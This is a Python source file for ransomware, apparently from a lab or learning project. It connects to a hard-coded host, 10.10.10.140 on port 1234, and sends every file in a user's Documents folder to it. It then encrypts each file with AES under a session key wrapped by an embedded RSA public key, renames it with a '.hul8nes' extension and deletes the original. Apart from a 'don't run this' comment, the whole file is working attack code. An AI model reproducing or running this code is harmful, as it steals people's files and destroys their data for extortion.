import socket
import threading
import os
import buffer
import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import tkinter as tk

HOST = '10.10.10.140'
PORT = 1234


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

def scanRecurse(baseDir):
    
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        

directory = 'C:\\Users\\Admin\\Documents\\' 
excludeExtension = ['.py','.pem', '.exe','.pyc','cpython-310.txt'] 
with s:
	sbuf = buffer.Buffer(s)

	hash_type = input('Enter hash type: ')

	 #files = input('Enter file(s) to send: ')
	 #files_to_send = files.split()
	 #for file_name in files_to_send:
	for item in scanRecurse(directory): 
		filePath = Path(item)
		fileType = filePath.suffix.lower()
		if fileType in excludeExtension:
			continue
			
		filePath = str(filePath)
		
		file_size = os.path.getsize(filePath)
		print("size sent")
		file_name=os.path.basename(filePath)
		
		sbuf.put_utf8(hash_type)
		sbuf.put_utf8(file_name)

		
		sbuf.put_utf8(str(file_size))
        
		with open(file_name, 'rb') as f:
			sbuf.put_bytes(f.read())
		print('File Sent')


# public key with base64 encoding
pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF3OWR0QUxhWWVra00wampwRmQ2agpBUFZkVnNZdE5YZHplcU5wREdUaXd1aVhTK3p5MmpsdmRadldOYlBleEJFUERxRUVEYzJiRFRHaXErQVJPSE90Ck8yL0FYYzNyOU9ybytqM1NvVm5jeFUwWGFicFhIYTdnWDFvL0hmZXp1dldLT3FKWTlRbTRRVlpwZmVWY1pUQVQKTVdpeGxSQ1gydE1mQ2VJVFhGL2UrVEhFT3lsZXVlVkhXdDFmd0FleWxrM1RUV0NJQjRDZ2JPYzQ0Um1zUkY3SgozZFFDSmJvUk1LR0hvbHlQTnRpQ0V4d0xrbkluT29seElzWTFQeFBpQW9LNThseUVQaDBrdGVheHp4N3hSb1o4CkxZQmgxSGwxT3lYS2NNWVE3L3lmQXFnYXFiOUthNGRzS3Y4SXhQeDZqN21JTmtGSGhTWStPZGhvUkh6SlE5bncKWVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
pubKey = base64.b64decode(pubKey)





def encrypt(dataFile, publicKey):
    '''
    Input: path to file to encrypt, public key
    Output: encrypted file with extension .L0v3sh3 and remove original file
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.importKey(publicKey)
    sessionKey = os.urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    fileName= dataFile.split(extension)[0]
    fileExtension = '.hul8nes'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    os.remove(dataFile)


# change directory to the directory of the script
# keep secure of changing the directory,
# DONT RUN THIS SCRIPT ON YOUR PC

for item in scanRecurse(directory): 
    filePath = Path(item)
    fileType = filePath.suffix.lower()

    if fileType in excludeExtension:
        continue
    encrypt(filePath, pubKey)
		